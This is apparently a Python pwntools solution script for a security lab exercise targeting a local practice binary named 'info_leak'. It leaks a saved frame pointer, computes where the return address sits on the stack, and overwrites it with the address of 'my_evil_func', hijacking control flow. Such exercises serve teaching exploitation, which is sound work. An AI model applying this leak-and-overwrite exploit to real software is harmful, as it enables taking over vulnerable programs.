#!/usr/bin/env python

from pwn import *

io = process("./info_leak")

# Determine my_evil_func address:
#    nm info_leak | grep ' my_evil_func'
evil_func_address = 0x0804852b

# Send 32 bytes to trigger leak. Extract leaked information.
io.send(32*"A")
out = io.recvline()

# From the output string (from the `out' variable) extract the leak.
# The leak starts at char index TODO and uses 4 bytes.
old_ebp = unpack(out[38:42], 'all', endian='little', sign=False)
log.info("old_ebp is 0x{:08x}".format(old_ebp))
ret_address_address = old_ebp - 0x4# TODO
log.info("return address is located at is 0x{:08x}".format(ret_address_address))

# Overwrite return address with address of my_evil_func. The program
# issues two read() calls.
# TODO
io.send(p32(ret_address_address))
io.send(p32(evil_func_address))
# The program isn't interactive, do nothing else.
